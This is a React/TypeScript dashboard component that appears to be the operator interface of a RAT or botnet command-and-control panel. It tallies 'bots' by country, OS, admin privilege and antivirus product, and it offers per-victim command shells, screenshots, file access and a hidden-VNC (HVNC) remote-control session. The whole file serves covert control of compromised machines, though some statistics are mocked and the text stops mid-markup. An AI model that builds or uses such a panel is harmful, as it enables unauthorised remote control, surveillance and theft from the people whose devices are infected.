import React, { useState, useEffect, lazy } from 'react';
import { 
  FiUsers, 
  FiMonitor, 
  FiActivity, 
  FiShield,
  FiTrendingUp,
  FiTrendingDown,
  FiAlertTriangle,
  FiCheckCircle,
  FiSmartphone,
  FiCommand,
  FiEye,
  FiDownload,
  FiTerminal,
  FiWifi,
  FiWifiOff,
  FiDesktop,
  FiMoreVertical,
  FiPlay,
  FiSquare,
  FiSettings,
  FiRefreshCw,
  FiGlobe,
  FiClock,
  FiMapPin,
  FiCpu,
  FiHardDrive
} from 'react-icons/fi';
import ApexCharts from 'react-apexcharts';
import { ApexOptions } from 'apexcharts';
import PlatformControls from './PlatformControls';
import agentService from '../services/agentService';
import { useNotification } from '../contexts/NotificationContext';
import { Agent } from '../types';
import CommandExecutor from './CommandExecutor';
import PlatformCapabilities from './PlatformCapabilities';
import { StatsSection } from './StatsSection';
import WorldMap from './WorldMap';
import { PieChart, Pie, Cell, ResponsiveContainer, Tooltip, Legend, LineChart, Line, XAxis, YAxis, CartesianGrid } from 'recharts';

// Lazy load the HVNC control component
const HvncControl = lazy(() => import('./HvncControl'));

interface DashboardProps {
  tableData: Agent[];
  activeTab?: string;
}

// Remove duplicate Agent interface - using the one from ../types

interface StatCardProps {
  title: string;
  value: string | number;
  change: string;
  changeType: 'increase' | 'decrease' | 'neutral';
  icon: React.ReactNode;
  color: string;
}

const StatCard: React.FC<StatCardProps> = ({ title, value, change, changeType, icon, color }) => {
  const getChangeIcon = () => {
    switch (changeType) {
      case 'increase':
        return <FiTrendingUp className="w-4 h-4 text-success" />;
      case 'decrease':
        return <FiTrendingDown className="w-4 h-4 text-danger" />;
      default:
        return <FiActivity className="w-4 h-4 text-warning" />;
    }
  };

  return (
    <div className="bg-gray-800 rounded-lg shadow-sm border border-gray-700 p-4 md:p-6 hover:shadow-md transition-shadow hover-lift">
      <div className="flex items-center justify-between">
        <div className="flex-1 min-w-0">
          <p className="text-sm font-medium text-gray-400 mb-1 truncate">{title}</p>
          <p className="text-xl md:text-2xl font-bold text-white mb-2">{value}</p>
          <div className="flex items-center space-x-1 flex-wrap">
            {getChangeIcon()}
            <span className={`text-sm font-medium ${
              changeType === 'increase' ? 'text-success' : 
              changeType === 'decrease' ? 'text-danger' : 'text-warning'
            }`}>
              {change}
            </span>
            <span className="text-xs text-gray-400 hidden sm:inline">vs last week</span>
          </div>
        </div>
        <div className={`w-10 h-10 md:w-12 md:h-12 rounded-lg flex items-center justify-center flex-shrink-0 ml-2 ${color}`}>
          {icon}
        </div>
      </div>
    </div>
  );
};

const Dashboard: React.FC<DashboardProps> = ({ tableData }) => {
  const { addNotification } = useNotification();
  const [systemStats, setSystemStats] = useState({
    totalClients: 0,
    activeClients: 0,
    offlineClients: 0,
    totalTasks: 0,
    completedTasks: 0,
    failedTasks: 0
  });
  const [showQuickControlModal, setShowQuickControlModal] = useState(false);
  const [quickControlData, setQuickControlData] = useState<{ agent: Agent; action: string } | null>(null);
  
  const [agents, setAgents] = useState<Agent[]>([]);
  const [selectedAgent, setSelectedAgent] = useState<Agent | null>(null);
  const [activeTab, setActiveTab] = useState<'overview' | 'rat' | 'hvnc'>('overview');
  const [isHvncActive, setIsHvncActive] = useState(false);
  const [isCommandExecutorOpen, setIsCommandExecutorOpen] = useState(false);
  const [commandExecutorAgent, setCommandExecutorAgent] = useState<Agent | null>(null);

  // Calculate derived values
  const onlineAgents = agents.filter(agent => agent.status === 'Online').length;
  const offlineAgents = agents.length - onlineAgents;

  // Chart data
  const COLORS = ['#10B981', '#F87171', '#F59E0B', '#8B5CF6'];
  const chartData = [
    { name: 'Online', value: onlineAgents },
    { name: 'Offline', value: offlineAgents }
  ];

  // Timeline data for activity chart
  const timelineData = [
    { date: '1', bots: 12 },
    { date: '5', bots: 8 },
    { date: '10', bots: 25 },
    { date: '15', bots: 35 },
    { date: '20', bots: 42 },
    { date: '25', bots: 28 },
    { date: '30', bots: 15 }
  ];

  // Country stats (mock data for now)
  const countryStats = {
    'United States': { count: Math.floor(onlineAgents * 0.3), online: Math.floor(onlineAgents * 0.25) },
    'Germany': { count: Math.floor(onlineAgents * 0.2), online: Math.floor(onlineAgents * 0.15) },
    'United Kingdom': { count: Math.floor(onlineAgents * 0.15), online: Math.floor(onlineAgents * 0.12) },
    'France': { count: Math.floor(onlineAgents * 0.12), online: Math.floor(onlineAgents * 0.1) },
    'Canada': { count: Math.floor(onlineAgents * 0.1), online: Math.floor(onlineAgents * 0.08) },
    'Australia': { count: Math.floor(onlineAgents * 0.08), online: Math.floor(onlineAgents * 0.06) },
    'Japan': { count: Math.floor(onlineAgents * 0.05), online: Math.floor(onlineAgents * 0.04) }
  };

  const countryStatsArray = Object.entries(countryStats).map(([name, stats]) => ({
    name,
    count: stats.count,
    online: stats.online
  })).sort((a, b) => b.count - a.count);

  // Calculate stats from tableData
  useEffect(() => {
    if (tableData && tableData.length > 0) {
      const active = tableData.filter(client => client.status === 'Online').length;
      const offline = tableData.length - active;
      
      setSystemStats({
        totalClients: tableData.length,
        activeClients: active,
        offlineClients: offline,
        totalTasks: Math.floor(Math.random() * 100) + 50,
        completedTasks: Math.floor(Math.random() * 80) + 40,
        failedTasks: Math.floor(Math.random() * 10) + 2
      });
      
      // Use tableData directly as it's already in Agent format
      setAgents(tableData);
    }
  }, [tableData]);

  // Chart configurations
  const clientStatusChartOptions: ApexOptions = {
    chart: {
      type: 'donut',
      height: 300,
      toolbar: { show: false }
    },
    labels: ['Online', 'Offline'],
    colors: ['#10B981', '#F87171'],
    legend: {
      position: 'bottom',
      labels: {
        colors: '#64748B'
      }
    },
    plotOptions: {
      pie: {
        donut: {
          size: '70%',
          labels: {
            show: true,
            total: {
              show: true,
              label: 'Total Clients',
              color: '#64748B'
            }
          }
        }
      }
    },
    dataLabels: {
      enabled: false
    },
    responsive: [{
      breakpoint: 480,
      options: {
        chart: {
          height: 250
        },
        legend: {
          position: 'bottom'
        }
      }
    }]
  };

  const activityChartOptions: ApexOptions = {
    chart: {
      type: 'area',
      height: 300,
      toolbar: { show: false },
      zoom: { enabled: false }
    },
    stroke: {
      curve: 'smooth',
      width: 2
    },
    fill: {
      type: 'gradient',
      gradient: {
        shadeIntensity: 1,
        opacityFrom: 0.7,
        opacityTo: 0.3
      }
    },
    colors: ['#3C50E0', '#80CAEE'],
    xaxis: {
      categories: ['00:00', '04:00', '08:00', '12:00', '16:00', '20:00', '24:00'],
      labels: {
        style: {
          colors: '#64748B'
        }
      }
    },
    yaxis: {
      labels: {
        style: {
          colors: '#64748B'
        }
      }
    },
    grid: {
      borderColor: '#E2E8F0'
    },
    legend: {
      labels: {
        colors: '#64748B'
      }
    }
  };

  const clientStatusSeries = [systemStats.activeClients, systemStats.offlineClients];
  const activitySeries = [
    {
      name: 'Active Connections',
      data: [30, 40, 35, 50, 49, 60, 70]
    },
    {
      name: 'System Load',
      data: [20, 30, 25, 40, 39, 50, 60]
    }
  ];

  const handleAgentSelect = (agent: Agent) => {
    setSelectedAgent(agent);
    setActiveTab('overview');
    addNotification('info', `Selected agent: ${agent.name}`);
  };

  const handleTabChange = (tab: 'overview' | 'rat' | 'hvnc') => {
    setActiveTab(tab);
    if (tab === 'hvnc') {
      // Simulate HVNC connection
      setIsHvncActive(true);
      addNotification('info', `Initializing HVNC session for ${selectedAgent?.name}`); 
    } else {
      setIsHvncActive(false);
    }
  };

  const handleQuickControl = (agent: Agent, action: string) => {
    setQuickControlData({ agent, action });
    setShowQuickControlModal(true);
    addNotification('info', `Executing ${action} on ${agent.name}`);
    
    // Handle different quick control actions
    switch (action) {
      case 'screenshot':
        // Implement screenshot logic
        break;
      case 'shell':
        setCommandExecutorAgent(agent);
        setIsCommandExecutorOpen(true);
        setShowQuickControlModal(false);
        break;
      case 'files':
        // Implement file manager logic
        break;
      default:
        break;
    }
  };

  // Enhanced client card component with detailed info and controls
  const ClientCard: React.FC<{ agent: Agent; onQuickControl: (agent: Agent, action: string) => void }> = ({ agent, onQuickControl }) => {
    const [showControls, setShowControls] = useState(false);
    
    const getStatusColor = (status: string) => {
      switch (status) {
        case 'Online': return 'text-green-400 bg-green-400/20';
        case 'Offline': return 'text-gray-400 bg-gray-400/20';
        case 'idle': return 'text-yellow-400 bg-yellow-400/20';
        default: return 'text-red-400 bg-red-400/20';
      }
    };

    const getPlatformIcon = (platform: string) => {
      switch (platform?.toLowerCase()) {
        case 'windows': return <FiDesktop className="w-4 h-4" />;
        case 'android': return <FiSmartphone className="w-4 h-4" />;
        case 'linux': return <FiTerminal className="w-4 h-4" />;
        default: return <FiMonitor className="w-4 h-4" />;
      }
    };

    const formatUptime = (uptime: number) => {
      if (!uptime) return 'N/A';
      const hours = Math.floor(uptime / 3600);
      const minutes = Math.floor((uptime % 3600) / 60);
      return `${hours}h ${minutes}m`;
    };

    const formatLastSeen = (lastSeen: string) => {
      if (!lastSeen) return 'Never';
      const date = new Date(lastSeen);
      const now = new Date();
      const diff = now.getTime() - date.getTime();
      const minutes = Math.floor(diff / 60000);
      
      if (minutes < 1) return 'Just now';
      if (minutes < 60) return `${minutes}m ago`;
      if (minutes < 1440) return `${Math.floor(minutes / 60)}h ago`;
      return `${Math.floor(minutes / 1440)}d ago`;
    };

    return (
      <div className="bg-black/40 border border-red-500/20 rounded-lg p-4 hover:border-red-500/40 transition-all duration-200 relative group">
        {/* Status indicator */}
        <div className={`absolute top-2 right-2 w-3 h-3 rounded-full ${getStatusColor(agent.status)} animate-pulse`}></div>
        
        {/* Quick controls button */}
        <div className="absolute top-2 right-8">
          <button
            onClick={() => setShowControls(!showControls)}
            className="opacity-0 group-hover:opacity-100 transition-opacity duration-200 p-1 hover:bg-red-500/20 rounded"
          >
            <FiMoreVertical className="w-4 h-4 text-gray-400" />
          </button>
        </div>

        {/* Quick controls dropdown */}
        {showControls && (
          <div className="absolute top-8 right-8 bg-black/90 border border-red-500/30 rounded-lg p-2 z-10 min-w-32">
            <button
              onClick={() => onQuickControl(agent, 'screenshot')}
              className="w-full text-left px-2 py-1 text-sm text-gray-300 hover:text-white hover:bg-red-500/20 rounded flex items-center gap-2"
            >
              <FiEye className="w-3 h-3" /> Screenshot
            </button>
            <button
              onClick={() => onQuickControl(agent, 'shell')}
              className="w-full text-left px-2 py-1 text-sm text-gray-300 hover:text-white hover:bg-red-500/20 rounded flex items-center gap-2"
            >
              <FiTerminal className="w-3 h-3" /> Shell
            </button>
            <button
              onClick={() => onQuickControl(agent, 'files')}
              className="w-full text-left px-2 py-1 text-sm text-gray-300 hover:text-white hover:bg-red-500/20 rounded flex items-center gap-2"
            >
              <FiHardDrive className="w-3 h-3" /> Files
            </button>
          </div>
        )}

        {/* Main content */}
        <div className="space-y-3">
          {/* Header with platform and name */}
          <div className="flex items-center gap-2">
            <div className="text-red-400">
              {getPlatformIcon(agent.platform)}
            </div>
            <div className="flex-1">
              <h3 className="text-white font-medium truncate">{agent.name}</h3>
              <p className="text-xs text-gray-400">{agent.platform}</p>
            </div>
          </div>

          {/* Key information grid */}
          <div className="grid grid-cols-2 gap-2 text-xs">
            <div className="flex items-center gap-1 text-gray-300">
              <FiGlobe className="w-3 h-3 text-blue-400" />
              <span className="truncate">{agent.ip}</span>
            </div>
            <div className="flex items-center gap-1 text-gray-300">
              <FiMapPin className="w-3 h-3 text-green-400" />
              <span className="truncate">Unknown</span>
            </div>
            <div className="flex items-center gap-1 text-gray-300">
              <FiClock className="w-3 h-3 text-yellow-400" />
              <span>N/A</span>
            </div>
            <div className="flex items-center gap-1 text-gray-300">
              <FiActivity className="w-3 h-3 text-purple-400" />
              <span>{formatLastSeen(agent.lastSeen)}</span>
            </div>
          </div>

          {/* Features/capabilities tags */}
          {agent.features && Object.keys(agent.features).length > 0 && (
            <div className="flex flex-wrap gap-1">
              {Object.entries(agent.features).filter(([_, enabled]) => enabled).slice(0, 3).map(([feature, _], index) => (
                <span
                  key={index}
                  className="px-2 py-1 text-xs bg-red-500/20 text-red-300 rounded border border-red-500/30"
                >
                  {feature}
                </span>
              ))}
              {Object.entries(agent.features).filter(([_, enabled]) => enabled).length > 3 && (
                <span className="px-2 py-1 text-xs bg-gray-500/20 text-gray-400 rounded">
                  +{Object.entries(agent.features).filter(([_, enabled]) => enabled).length - 3}
                </span>
              )}
            </div>
          )}
        </div>
      </div>
    );
  };

  const getPlatformIcon = (platform: string) => {
    switch (platform) {
      case 'windows':
        return <FiMonitor className="w-5 h-5" />;
      case 'mac':
        return <FiCommand className="w-5 h-5" />;
      case 'android':
        return <FiSmartphone className="w-5 h-5" />;
      default:
        return <FiMonitor className="w-5 h-5" />;
    }
  };

  const renderAgentDetails = () => {
    if (!selectedAgent) return null;

    switch (activeTab) {
      case 'overview':
        return (
          <div className="bg-white dark:bg-boxdark rounded-lg p-4 shadow-sm">
            <h3 className="text-lg font-semibold mb-4 flex items-center">
              {getPlatformIcon(selectedAgent.platform)}
              <span className="ml-2">{selectedAgent.name}</span>
              <span className={`ml-2 text-xs px-2 py-1 rounded-full ${selectedAgent.status === 'Online' ? 'bg-success text-white' : 'bg-danger text-white'}`}>
                {selectedAgent.status}
              </span>
            </h3>
            
            <div className="grid grid-cols-2 gap-4 mb-4">
              <div>
                <p className="text-sm text-bodydark2">IP Address</p>
                <p className="font-medium">{selectedAgent.ip}</p>
              </div>
              <div>
                <p className="text-sm text-bodydark2">Last Seen</p>
                <p className="font-medium">{new Date(selectedAgent.lastSeen).toLocaleString()}</p>
              </div>
              <div>
                <p className="text-sm text-bodydark2">Platform</p>
                <p className="font-medium capitalize">{selectedAgent.platform}</p>
              </div>
              <div>
                <p className="text-sm text-bodydark2">Version</p>
                <p className="font-medium">{selectedAgent.version}</p>
              </div>
            </div>
            
            <h4 className="font-medium mb-2">Available Features</h4>
            <div className="grid grid-cols-2 gap-2">
              {Object.entries(selectedAgent.features).map(([feature, enabled]) => (
                <div key={feature} className={`flex items-center p-2 rounded ${enabled ? 'bg-success/10' : 'bg-danger/10'}`}>
                  <div className={`w-3 h-3 rounded-full mr-2 ${enabled ? 'bg-success' : 'bg-danger'}`}></div>
                  <span className="capitalize">{feature.replace(/([A-Z])/g, ' $1')}</span>
                </div>
              ))}
            </div>
          </div>
        );
      
      case 'rat':
        return (
          <div className="space-y-4">
            {/* Quick Actions */}
            <div className="bg-white dark:bg-boxdark rounded-lg p-4 shadow-sm">
              <h4 className="font-semibold mb-3">Quick Actions</h4>
              <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
                <button
                  onClick={() => {
                    setCommandExecutorAgent(selectedAgent);
                    setIsCommandExecutorOpen(true);
                  }}
                  className="flex flex-col items-center p-3 border border-stroke dark:border-strokedark rounded-lg hover:bg-primary/10 hover:border-primary transition-colors"
                >
                  <FiTerminal className="w-6 h-6 mb-2 text-primary" />
                  <span className="text-sm font-medium">Command Shell</span>
                </button>
                <button className="flex flex-col items-center p-3 border border-stroke dark:border-strokedark rounded-lg hover:bg-primary/10 hover:border-primary transition-colors">
                  <FiMonitor className="w-6 h-6 mb-2 text-primary" />
                  <span className="text-sm font-medium">Screen Capture</span>
                </button>
                <button className="flex flex-col items-center p-3 border border-stroke dark:border-strokedark rounded-lg hover:bg-primary/10 hover:border-primary transition-colors">
                  <FiDownload className="w-6 h-6 mb-2 text-primary" />
                  <span className="text-sm font-medium">File Manager</span>
                </button>
                <button className="flex flex-col items-center p-3 border border-stroke dark:border-strokedark rounded-lg hover:bg-primary/10 hover:border-primary transition-colors">
                  <FiSettings className="w-6 h-6 mb-2 text-primary" />
                  <span className="text-sm font-medium">System Info</span>
                </button>
              </div>
            </div>
            
            <PlatformControls
              platform={selectedAgent.platform}
              features={selectedAgent.features}
              onExecuteCommand={(command, params) => {
                console.log(`Executing command: ${command}`, params);
                // Call the agent service to execute the command
                agentService.sendCommand(selectedAgent.id, command, params)
                  .then(response => {
                    if (response.success) {
                      console.log('Command executed successfully:', response);
                    } else {
                      console.error('Command execution failed:', response.message);
                    }
                  })
                  .catch(error => {
                    console.error('Error executing command:', error);
                  });
              }}
            />
          </div>
        );
      
      case 'hvnc':
        return (
          <div className="space-y-6">
            {/* Platform Capabilities Overview */}
            <PlatformCapabilities 
              platform={selectedAgent.platform} 
              className="mb-6"
            />
            
            {/* HVNC Control Panel */}
            <div className="bg-white dark:bg-boxdark rounded-lg p-4 shadow-sm">
              <div className="flex justify-between items-center mb-4">
                <h3 className="text-lg font-semibold">HVNC Remote Control</h3>
                <div className="flex items-center">
                  <span className={`inline-block w-3 h-3 rounded-full mr-2 ${isHvncActive ? 'bg-success' : 'bg-danger'}`}></span>
                  <span>{isHvncActive ? 'Connected' : 'Disconnected'}</span>
                </div>
              </div>
              
              {isHvncActive ? (
                <React.Suspense fallback={
                  <div className="text-center py-8">
                    <div className="animate-spin w-8 h-8 border-4 border-primary border-t-transparent rounded-full mx-auto mb-4"></div>
                    <p>Loading HVNC control panel...</p>
                  </div>
                }>
                  <HvncControl 
                    agent={selectedAgent}
                    isConnected={isHvncActive}
                    onConnect={() => setIsHvncActive(true)}
                    onDisconnect={() => setIsHvncActive(false)}
                    platform={selectedAgent.platform}
                    sessionId={`hvnc-${selectedAgent.uuid.slice(0, 8)}`}
                  />
                </React.Suspense>
              ) : (
                <div className="text-center p-6">
                  <FiEye className="w-12 h-12 mx-auto mb-3 text-bodydark2" />
                  <p>HVNC connection not established</p>
                  <button 
                    className="mt-3 px-4 py-2 bg-primary text-white rounded"
                    onClick={() => setIsHvncActive(true)}
                  >
                    Connect
                  </button>
                </div>
              )}
            </div>
          </div>
        );
      
      default:
        return null;
    }
  };

  return (
    <div className="min-h-screen bg-gray-900 text-white">
      <div className="mx-auto max-w-screen-2xl p-4 md:p-6 2xl:p-10">
        {/* Welcome Section */}
        <div className="mb-6 flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between">
          <h2 className="text-title-md2 font-semibold text-white">
            Dashboard
          </h2>
        </div>

        {/* Statistics Overview - Top Row */}
        <div className="grid grid-cols-1 gap-4 md:grid-cols-2 md:gap-6 xl:grid-cols-4 2xl:gap-7.5 mb-6">
          <StatCard
            title="TOTAL BOTS"
            value={agents.length}
            change="+12%"
            changeType="increase"
            icon={<FiUsers className="w-6 h-6 text-white" />}
            color="bg-blue-600"
          />
          <StatCard
            title="ONLINE BOTS"
            value={onlineAgents}
            change="+8%"
            changeType="increase"
            icon={<FiWifi className="w-6 h-6 text-white" />}
            color="bg-green-600"
          />
          <StatCard
            title="OFFLINE BOTS"
            value={offlineAgents}
            change="-3%"
            changeType="decrease"
            icon={<FiWifiOff className="w-6 h-6 text-white" />}
            color="bg-red-600"
          />
          <StatCard
            title="LAST SEEN"
            value="2m ago"
            change="Just now"
            changeType="neutral"
            icon={<FiClock className="w-6 h-6 text-white" />}
            color="bg-yellow-600"
          />
        </div>

        {/* Second Row - Top 5 Countries and World Map */}
        <div className="grid grid-cols-1 gap-4 md:gap-6 xl:grid-cols-2 2xl:gap-7.5 mb-6">
          {/* Top 5 Countries */}
          <div className="bg-gray-800 rounded-lg border border-gray-700 p-6 shadow-sm">
            <div className="mb-4 flex items-center justify-between">
              <h4 className="text-lg font-semibold text-blue-400 flex items-center">
                <span className="bg-blue-600 text-white px-2 py-1 rounded text-sm mr-2">🏆</span>
                Top 5 Countries
              </h4>
            </div>
            <div className="space-y-3">
              {countryStatsArray.slice(0, 5).map((country, index) => (
                <div key={country.name} className="flex items-center justify-between p-3 rounded-lg bg-gray-700 border border-gray-600">
                  <div className="flex items-center space-x-3">
                    <span className="text-lg">🌍</span>
                    <span className="font-medium text-white">{country.name}</span>
                  </div>
                  <div className="text-right">
                    <div className="font-bold text-white">{country.count}</div>
                    <div className="text-sm text-green-400">{country.online} online</div>
                  </div>
                </div>
              ))}
            </div>
          </div>

          {/* World Map */}
          <div className="bg-gray-800 rounded-lg border border-gray-700 p-6 shadow-sm">
            <div className="mb-4 flex items-center justify-between">
              <h4 className="text-lg font-semibold text-blue-400 flex items-center">
                <span className="bg-blue-600 text-white px-2 py-1 rounded text-sm mr-2">🗺️</span>
                World Map
              </h4>
            </div>
            <div className="h-64 bg-gray-700 rounded-lg overflow-hidden">
              <WorldMap agents={agents} height={256} onAgentClick={handleAgentSelect} />
            </div>
          </div>
        </div>

        {/* Third Row - Bots Distribution and Activity Chart */}
        <div className="grid grid-cols-1 gap-4 md:grid-cols-2 2xl:grid-cols-4 2xl:gap-7.5 mb-6">
          {/* Bots Distribution by Country */}
          <div className="bg-gray-800 rounded-lg border border-gray-700 p-6 shadow-sm">
            <div className="mb-4 flex items-center justify-between">
              <h4 className="text-lg font-semibold text-blue-400 flex items-center">
                <span className="bg-blue-600 text-white px-2 py-1 rounded text-sm mr-2">📊</span>
                Bots Distribution by Country
              </h4>
            </div>
            <div className="h-64">
              <ResponsiveContainer width="100%" height="100%">
                <PieChart>
                  <Pie
                    data={chartData}
                    cx="50%"
                    cy="50%"
                    labelLine={false}
                    label={({ name, percent }) => `${name} ${(percent * 100).toFixed(0)}%`}
                    outerRadius={80}
                    fill="#8884d8"
                    dataKey="value"
                  >
                    {chartData.map((entry, index) => (
                      <Cell key={`cell-${index}`} fill={COLORS[index % COLORS.length]} />
                    ))}
                  </Pie>
                  <Tooltip />
                  <Legend />
                </PieChart>
              </ResponsiveContainer>
            </div>
          </div>

          {/* Bots Per Day (Last 30 days) */}
          <div className="bg-gray-800 rounded-lg border border-gray-700 p-6 shadow-sm">
            <div className="mb-4 flex items-center justify-between">
              <h4 className="text-lg font-semibold text-blue-400 flex items-center">
                <span className="bg-blue-600 text-white px-2 py-1 rounded text-sm mr-2">📈</span>
                Bots Per Day (Last 30 days)
              </h4>
            </div>
            <div className="h-64">
              <ResponsiveContainer width="100%" height="100%">
                <LineChart data={timelineData}>
                  <CartesianGrid strokeDasharray="3 3" stroke="#374151" />
                  <XAxis dataKey="date" stroke="#9CA3AF" />
                  <YAxis stroke="#9CA3AF" />
                  <Tooltip 
                    contentStyle={{ 
                      backgroundColor: '#1F2937', 
                      border: '1px solid #374151',
                      borderRadius: '8px',
                      color: '#fff'
                    }} 
                  />
                  <Line type="monotone" dataKey="bots" stroke="#3B82F6" strokeWidth={2} />
                </LineChart>
              </ResponsiveContainer>
            </div>
          </div>
        </div>

        {/* Fourth Row - Additional Statistics */}
        <div className="grid grid-cols-1 gap-4 md:grid-cols-2 md:gap-6 xl:grid-cols-2 2xl:gap-7.5 mb-6">
          {/* Top 5 Operating Systems */}
          <div className="bg-gray-800 rounded-lg border border-gray-700 p-6 shadow-sm">
            <div className="mb-4 flex items-center justify-between">
              <h4 className="text-lg font-semibold text-blue-400 flex items-center">
                <span className="bg-blue-600 text-white px-2 py-1 rounded text-sm mr-2">💻</span>
                Top 5 Operating Systems
              </h4>
            </div>
            <div className="space-y-3">
              {[
                { name: 'Windows 10', count: Math.floor(agents.length * 0.4), icon: '🪟' },
                { name: 'Windows 11', count: Math.floor(agents.length * 0.3), icon: '🪟' },
                { name: 'Android 12', count: Math.floor(agents.length * 0.15), icon: '📱' },
                { name: 'macOS', count: Math.floor(agents.length * 0.1), icon: '🍎' },
                { name: 'Linux', count: Math.floor(agents.length * 0.05), icon: '🐧' }
              ].map((os, index) => (
                <div key={os.name} className="flex items-center justify-between p-3 rounded-lg bg-gray-700 border border-gray-600">
                  <div className="flex items-center space-x-3">
                    <span className="text-lg">{os.icon}</span>
                    <span className="font-medium text-white">{os.name}</span>
                  </div>
                  <div className="font-bold text-white">{os.count}</div>
                </div>
              ))}
            </div>
          </div>

          {/* Privileges */}
          <div className="bg-gray-800 rounded-lg border border-gray-700 p-6 shadow-sm">
            <div className="mb-4 flex items-center justify-between">
              <h4 className="text-lg font-semibold text-blue-400 flex items-center">
                <span className="bg-blue-600 text-white px-2 py-1 rounded text-sm mr-2">🔐</span>
                Privileges
              </h4>
            </div>
            <div className="space-y-3">
              {[
                { name: 'Administrator', count: Math.floor(agents.length * 0.6), icon: '👑' },
                { name: 'User', count: Math.floor(agents.length * 0.3), icon: '👤' },
                { name: 'Guest', count: Math.floor(agents.length * 0.1), icon: '👥' }
              ].map((privilege, index) => (
                <div key={privilege.name} className="flex items-center justify-between p-3 rounded-lg bg-gray-700 border border-gray-600">
                  <div className="flex items-center space-x-3">
                    <span className="text-lg">{privilege.icon}</span>
                    <span className="font-medium text-white">{privilege.name}</span>
                  </div>
                  <div className="font-bold text-white">{privilege.count}</div>
                </div>
              ))}
            </div>
          </div>
        </div>

        {/* Fourth Row - Additional Statistics */}
        <div className="grid grid-cols-1 gap-4 md:grid-cols-2 md:gap-6 xl:grid-cols-2 2xl:gap-7.5">
          {/* Top 5 Antivirus Software */}
          <div className="bg-gray-800 rounded-lg border border-gray-700 p-6 shadow-sm">
            <div className="mb-4 justify-between gap-4 sm:flex">
              <div>
                <h4 className="text-xl font-semibold text-black dark:text-white">
                  🛡️ Top 5 Antivirus Software
                </h4>
              </div>
            </div>
            <div className="space-y-3">
              {[
                { name: 'Windows Defender', count: Math.floor(agents.length * 0.5) },
                { name: 'Avast', count: Math.floor(agents.length * 0.2) },
                { name: 'AVG', count: Math.floor(agents.length * 0.15) },
                { name: 'Norton', count: Math.floor(agents.length * 0.1) },
                { name: 'McAfee', count: Math.floor(agents.length * 0.05) }
              ].map((av) => (
                <div key={av.name} className="flex items-center justify-between p-3 rounded-lg bg-gray-2 dark:bg-meta-4">
                  <span className="font-medium text-black dark:text-white">{av.name}</span>
                  <span className="font-bold text-black dark:text-white">{av.count}</span>
                </div>
              ))}
            </div>
          </div>

          {/* Device Type */}
          <div className="bg-gray-800 rounded-lg border border-gray-700 p-6 shadow-sm">
            <div className="mb-4 justify-between gap-4 sm:flex">
              <div>
                <h4 className="text-xl font-semibold text-black dark:text-white">
                  📱 Device Type
                </h4>
              </div>
            </div>
            <ResponsiveContainer width="100%" height={200}>
              <PieChart>
                <Pie
                  data={[
                    { name: 'Desktop', value: Math.floor(agents.length * 0.6), fill: '#3C50E0' },
                    { name: 'Mobile', value: Math.floor(agents.length * 0.3), fill: '#80CAEE' },
                    { name: 'Tablet', value: Math.floor(agents.length * 0.1), fill: '#0FADCF' }
                  ]}
                  cx="50%"
                  cy="50%"
                  outerRadius={80}
                  dataKey="value"
                  label
                >
                </Pie>
                <Tooltip />
                <Legend />
              </PieChart>
            </ResponsiveContainer>
          </div>
        </div>

        {/* Agent Management Section */}
        <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
          {/* Agent List */}
          <div className="lg:col-span-1 bg-white dark:bg-boxdark rounded-lg shadow-sm">
            <div className="p-4 border-b border-stroke dark:border-strokedark">
              <div className="flex items-center justify-between mb-3">
                <h3 className="text-lg font-semibold">Live Connections ({agents.filter(agent => agent.status === 'Online').length})</h3>
                {/* Small WorldMap Preview */}
                <div className="relative w-20 h-12 bg-gradient-to-br from-blue-900/20 to-blue-600/20 rounded-md border border-blue-500/30 overflow-hidden">
                  <div className="absolute inset-0 bg-gradient-to-br from-slate-800 to-slate-900 opacity-80"></div>
                  <div className="absolute inset-0 flex items-center justify-center">
                    <div className="grid grid-cols-4 gap-px w-full h-full p-1">
                      {/* Simplified world map dots */}
                      <div className="bg-blue-400/60 rounded-full w-1 h-1 animate-pulse"></div>
                      <div className="bg-blue-400/40 rounded-full w-1 h-1"></div>
                      <div className="bg-blue-400/80 rounded-full w-1 h-1 animate-pulse delay-300"></div>
                      <div className="bg-blue-400/30 rounded-full w-1 h-1"></div>
                      <div className="bg-blue-400/50 rounded-full w-1 h-1"></div>
                      <div className="bg-blue-400/70 rounded-full w-1 h-1 animate-pulse delay-150"></div>
                      <div className="bg-blue-400/40 rounded-full w-1 h-1"></div>
                      <div className="bg-blue-400/60 rounded-full w-1 h-1"></div>
                    </div>
                  </div>
                  <div className="absolute top-0 right-0 w-2 h-2 bg-blue-400 rounded-full animate-ping opacity-75"></div>
                  <div className="absolute bottom-1 left-1 text-xs text-blue-300 font-mono">MAP</div>
                </div>
              </div>
              <div className="mt-2 flex">
                <div className="relative flex-1">
                  <input 
                    type="text" 
                    placeholder="Search agents..." 
                    className="w-full rounded-lg border border-stroke bg-transparent py-2 pl-10 pr-4 text-black dark:text-white outline-none focus:border-primary"
                  />
                  <span className="absolute left-3 top-2.5 text-bodydark2">
                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={1.5} stroke="currentColor" className="w-5 h-5">
                      <path strokeLinecap="round" strokeLinejoin="round" d="M21 21l-5.197-5.197m0 0A7.5 7.5 0 105.196 5.196a7.5 7.5 0 0010.607 10.607z" />
                    </svg>
                  </span>
                </div>
                <button className="ml-2 p-2 rounded-lg border border-stroke hover:bg-gray-100 dark:hover:bg-meta-4">
                  <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={1.5} stroke="currentColor" className="w-5 h-5">
                    <path strokeLinecap="round" strokeLinejoin="round" d="M12 3c2.755 0 5.455.232 8.083.678.533.09.917.556.917 1.096v1.044a2.25 2.25 0 01-.659 1.591l-5.432 5.432a2.25 2.25 0 00-.659 1.591v2.927a2.25 2.25 0 01-1.244 2.013L9.75 21v-6.568a2.25 2.25 0 00-.659-1.591L3.659 7.409A2.25 2.25 0 013 5.818V4.774c0-.54.384-1.006.917-1.096A48.32 48.32 0 0112 3z" />
                  </svg>
                </button>
              </div>
            </div>
            
            <div className="p-2 max-h-[600px] overflow-y-auto">
              {agents.filter(agent => agent.status === 'Online').length > 0 ? (
                <div className="space-y-2">
                  {agents
                    .filter(agent => agent.status === 'Online')
                    .map((agent) => (
                      <ClientCard
                        key={agent.id}
                        agent={agent}
                        onQuickControl={handleQuickControl}
                      />
                    ))}
                </div>
              ) : (
                <div className="py-8 text-center text-bodydark2">
